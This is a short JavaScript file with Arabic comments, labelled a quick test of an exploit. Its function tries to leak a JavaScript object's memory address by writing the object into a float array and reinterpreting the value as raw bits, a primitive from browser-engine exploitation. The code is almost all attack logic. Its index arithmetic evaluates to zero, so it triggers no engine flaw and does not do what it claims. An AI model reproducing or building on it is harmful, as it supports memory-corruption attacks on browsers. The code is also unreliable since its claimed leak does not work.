// نسخة مبسطة للاختبار السريع
function quick_exploit() {
    let arr = [];
    for (let i = 0; i < 2000; i++) arr[i] = i + 0.1;
    for (let i = 0; i < (1 << 22); i++) arr[i] = i + 0.1;
    
    let obj = {secret: 0x12345678, name: "test_object"};
    let a = [1.1, 2.2, 3.3];
    
    let largeLength = Object.keys(arr).length;
    let index = (largeLength << 3) >> 31;
    
    for (let i = 1; i >= index; i--) {
        a[i] = obj;
    }
    
    let result = `النتيجة:\n`;
    result += `a[0]: ${a[0]} (${typeof a[0]})\n`;
    result += `a[1]: ${a[1]} (${typeof a[1]})\n`; 
    result += `a[2]: ${a[2]} (${typeof a[2]})\n`;
    
    if (typeof a[1] === 'object') {
        result += `\n✅ النجاح! a[1].secret = 0x${a[1].secret.toString(16)}`;
    } else if (isNaN(a[1])) {
        result += `\n📌 ظهر QNaN (مؤشر كائن)`;
        
        // استخراج العنوان
        let f64 = new Float64Array(1);
        let u32 = new Uint32Array(f64.buffer);
        f64[0] = a[1];
        let addr = (BigInt(u32[1]) << 32n) | BigInt(u32[0]);
        result += `\nالعنوان: 0x${addr.toString(16)}`;
    }
    
    alert(result);
}

// اختر أي دالة تريد تشغيلها
quick_exploit();
// أو
// exploit_full();